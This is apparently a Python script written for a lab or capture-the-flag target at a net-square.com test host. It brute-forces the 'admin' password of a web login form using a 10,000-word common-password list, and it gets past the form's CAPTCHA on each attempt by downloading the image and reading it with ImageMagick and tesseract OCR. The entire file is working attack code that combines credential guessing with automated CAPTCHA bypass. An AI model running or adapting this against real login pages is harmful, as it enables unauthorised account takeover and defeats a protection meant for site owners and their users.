import requests
import json
import os, commands, re


words = [w.strip() for w in open("10k-most-common.txt", "rb").readlines()] 

http_proxy  = "http://127.0.0.1:8080"
proxyDict = { "http"  : http_proxy}

for line in words:

	def mymy():
		url = "http://enigma.test.net-square.com:26010/cod/captcha.ns"

		headers = {  
	    "Host": "enigma.test.net-square.com:26010",
		"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "close",
		"Cookie": "ENIGMA-SESSION=lrQqA3VKgCleh11jR1sLWeDVLVc;",
		"Upgrade-Insecure-Requests": "1"

	}

		cookies = {'ENIGMA-SESSION': 'lrQqA3VKgCleh11jR1sLWeDVLVc;'}
		#r = requests.get(url, cookies=cookies,proxies=proxyDict)
		r = requests.get(url, cookies=cookies)
		#print(r.content)
		
		open('captcha.png', 'wb').write( r.content )
		
		os.system('convert captcha.png -colorspace gray -compress none -threshold 50% img.png')
		
		captcha = commands.getoutput("tesseract img.png -").strip()
		
		url2 = "http://enigma.test.net-square.com:26010/cod/c39.ns"
		headers2 = {
		'Host': 'enigma.test.net-square.com:26010',
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '47',
		'Origin': 'http://enigma.test.net-square.com:26010',
		'Connection': 'close',
		'Referer': 'http://enigma.test.net-square.com:26010/cod/c39.ns',
		'Cookie': 'ENIGMA-SESSION=lrQqA3VKgCleh11jR1sLWeDVLVc;',
		'Upgrade-Insecure-Requests': '1',
		}
		
		password = "{}".format(line.strip())
		
		data1 = 'username=admin&password='
		data2 = password
		data3 = '&captcha='
		data4 = captcha
		
		brute = requests.post(url2, headers=headers2, data=data1+data2+data3+data4)
		
		
		#print(brute.content)
		#print(brute.text)
		#print(password)
		
		if "<font color=\"red\">Incorrect Captcha!</font>	</body>" in brute.text:
			print("Wrong Captha at "+ password)
			mymy()
		elif "<font color=\"red\">Invalid Credentials!</font>	</body>" in brute.text:
			print("Invalid Creds")
		else:
			print("Your Password is " + password)
			exit()
	mymy()
		


